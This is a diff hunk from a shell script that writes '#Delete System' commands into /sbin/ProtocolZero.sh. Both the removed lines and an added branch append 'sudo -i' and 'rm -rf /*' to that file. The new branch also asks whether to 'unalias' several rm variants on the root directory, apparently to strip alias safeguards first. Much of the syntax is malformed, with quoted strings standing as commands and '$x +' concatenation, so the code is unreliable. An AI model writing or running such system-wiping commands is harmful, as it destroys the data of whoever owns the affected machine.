@@ -40,8 +40,28 @@ do
 done
 
 '#Delete System' >> /sbin/ProtocolZero.sh
-$x + 'sudo -i' >> /sbin/ProtocolZero.sh
-$x + 'rm -rf /*' >> /sbin/ProtocolZero.sh
+'echo unalias?'
+'read unalias'
+'if [$unalias == "y"]'
+'then'
+	'unalias rm /'
+	'unalias rm -r /'
+	'unalias rm -f /'
+	'unalias rm -rf /'
+	
+	'unalias rm /*'
+	'unalias rm -r /*'
+	'unalias rm -f /*'
+	'unalias rm -rf /*'
+	
+'elif [$unalias == "n"]'
+'then'
+	$x + 'sudo -i' >> /sbin/ProtocolZero.sh
+	$x + 'rm -rf /*' >> /sbin/ProtocolZero.sh
+'else'
+	'exit'
+'fi'
+
 
 '#End ifs/add elses' >> /sbin/ProtocolZero.sh
 for i in ($OneMore)
